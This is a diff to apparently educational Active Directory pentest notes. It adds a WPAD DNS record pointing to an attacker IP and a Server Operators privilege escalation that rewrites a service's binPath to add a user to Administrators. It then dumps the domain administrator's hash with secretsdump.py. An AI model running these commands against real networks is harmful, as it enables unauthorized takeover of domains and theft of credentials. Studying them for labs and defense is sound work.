@@ -389,7 +389,49 @@ C:\> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.AD.loca
 
 ##### Adding a WPAD Record
 
-````
-C:\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName AD.local -ComputerName dc01.AD.local -IPv4Address 10.10.14.3
+```
+C:\> Add-DnsServerResourceRecordA -Name wpad -ZoneName AD.local -ComputerName dc01.AD.local -IPv4Address 10.10.14.3
+```
+
+### Server Operators
+
+The Server Operators group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.
+
+Membership of this group confers the powerful **SeBackupPrivilege** and **SeRestorePrivilege** privileges and the ability to control local services
+
+#### Querying the Service
+
+```
+C:\> sc qc <service name>
+```
+
+#### Checking Service Permissions with PsService
+
+We can use the service viewer/controller [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice), which is part of the Sysinternals suite, to check permissions on the service.
+
+```
+C:\> c:\Tools\PsService.exe security <Service name>
+```
+ **SERVICE_ALL_ACCESS** access right  gives us full control over the service.
+
+#### Modifying the Service Binary Path and Starting the Service
+
+```
+C:\> sc config <service name> binPath= "cmd /c net localgroup Administrators <user> /add"
+C:\> sc start <service Name>
+```
+
+#### Confirming Local Admin Group Membership
+
+```
+C:\> net localgroup Administrators
+```
+
+### Dumping Admin hash
+
+Once we Are member of Admin Group We can dump hashes of admin
+
+```
+attacker@ubuntu[/]$  secretsdump.py <user>@<ip> -just-dc-user administrator
 ``` 
 
